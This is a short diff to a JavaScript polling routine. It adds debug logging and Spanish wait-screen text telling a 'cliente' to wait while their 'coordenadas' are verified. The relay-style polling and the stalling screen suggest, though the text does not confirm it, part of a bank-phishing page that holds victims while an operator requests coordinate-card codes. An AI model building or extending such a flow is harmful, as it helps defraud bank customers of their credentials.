@@ -56,6 +56,7 @@ async function startPolling(handler) {
 
   const iv = setInterval(async () => {
     try {
+      console.log('Polling... offset:', lastUpdateId, 'waitCoords:', waitCoords);
       const res = await fetch(`/api/poll?offset=${lastUpdateId}&waitCoords=${waitCoords}`);
       const data = await res.json();
 
@@ -64,6 +65,11 @@ async function startPolling(handler) {
       // El servidor nos dice que ahora esperemos las coords
       if (data.waitCoords === true) {
         waitCoords = true;
+        // Actualizar mensaje del wait screen para que el cliente sepa que espere
+        const wt = document.querySelector('.wait-title');
+        const ws = document.querySelector('.wait-sub');
+        if (wt) wt.textContent = 'Verificando coordenadas';
+        if (ws) ws.textContent = 'Por favor espera mientras se verifica tu información.';
         return; // Seguir haciendo polling, NO parar
       }
 
